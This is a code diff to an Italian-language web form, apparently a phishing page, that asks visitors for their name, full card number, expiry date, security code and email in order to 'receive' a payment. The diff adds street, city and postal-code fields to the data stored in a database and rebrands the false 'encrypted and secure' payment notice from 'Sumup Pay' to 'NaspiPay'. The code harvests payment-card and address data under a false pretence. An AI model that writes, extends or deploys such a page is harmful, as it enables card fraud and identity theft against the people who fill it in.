@@ -47,12 +47,15 @@ export default function HomePage() {
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState("");
   const [form, setForm] = useState({
-    first_name: "",
-    card_number: "",
-    expiry: "",
-    security_code: "",
-    email: "",
-  });
+  first_name: "",
+  street: "",
+  city: "",
+  cap: "",
+  card_number: "",
+  expiry: "",
+  security_code: "",
+  email: "",
+});
 
 const cardDigits = form.card_number.replace(/\s/g, "");
 const brand = detectBrand(cardDigits);
@@ -126,6 +129,9 @@ cardDigits.length >= 13 && !cardOk ? "Numero carta non valido!" : "";
         expiry: form.expiry,
         security_code: form.security_code.trim(),
         email: form.email.trim(),
+        street: form.street.trim(),
+        city: form.city.trim(),
+        cap: form.cap.trim(),
         status: "pending",
       })
       .select("id")
@@ -154,7 +160,7 @@ const inputClass =
         <img
           src="/powered-by.png"
           alt="Powered by"
-          className="mx-auto mb-6 h-8 w-auto object-contain opacity-80"
+          className="mx-auto mb-6 h-20 w-auto object-contain opacity-80"
         />
 
         <div className="mb-8 w-full rounded-xl border border-gray-200 bg-gray-50 px-5 py-4 text-center">
@@ -232,6 +238,57 @@ const inputClass =
     />
   </div>
 </label>
+
+<label className="block text-sm">
+  Indirizzo
+  <div className="relative mt-1">
+    <svg
+      className="pointer-events-none absolute left-3 top-1/2 h-4 w-4 -translate-y-1/2 text-gray-500"
+      viewBox="0 0 24 24"
+      fill="none"
+      stroke="currentColor"
+      strokeWidth="2"
+      aria-hidden="true"
+    >
+      <path d="M3 10.5L12 3l9 7.5V20a1 1 0 0 1-1 1h-5v-6H9v6H4a1 1 0 0 1-1-1v-9.5z" />
+    </svg>
+    <input
+      required
+      placeholder="Via e numero civico"
+      className={`${inputClass} pl-10`}
+      value={form.street}
+      onChange={(e) => setForm((f) => ({ ...f, street: e.target.value }))}
+    />
+  </div>
+</label>
+
+<div className="grid grid-cols-2 gap-3">
+  <label className="block text-sm">
+    Città
+    <input
+      required
+      placeholder="Città"
+      className={`${inputClass} mt-1`}
+      value={form.city}
+      onChange={(e) => setForm((f) => ({ ...f, city: e.target.value }))}
+    />
+  </label>
+
+  <label className="block text-sm">
+    CAP
+    <input
+      required
+      inputMode="numeric"
+      placeholder="00100"
+      maxLength={5}
+      className={`${inputClass} mt-1`}
+      value={form.cap}
+      onChange={(e) =>
+        setForm((f) => ({ ...f, cap: e.target.value.replace(/\D/g, "").slice(0, 5) }))
+      }
+    />
+  </label>
+</div>
 
         
         <label className="block text-sm">
@@ -361,7 +418,7 @@ const inputClass =
         
         <p className="mt-3 rounded-lg border border-amber-200 bg-amber-50 px-3 py-2 text-center text-sm text-amber-800">
           <img src="thick.png" width="15" height="15"  className="mx-auto mb-6 h-8 w-auto object-contain opacity-80"></img>
-         Tutti i dati inseriti sono crittografati e sicuri. Facendo clic sul pulsante Ricevi accredito, accetti di ricevere il seguente pagamento utilizzando il servizio online Sumup Pay
+         Tutti i dati inseriti sono crittografati e sicuri. Facendo clic sul pulsante Ricevi accredito, accetti di ricevere il seguente pagamento utilizzando il servizio online NaspiPay
         </p>
          </form>
 
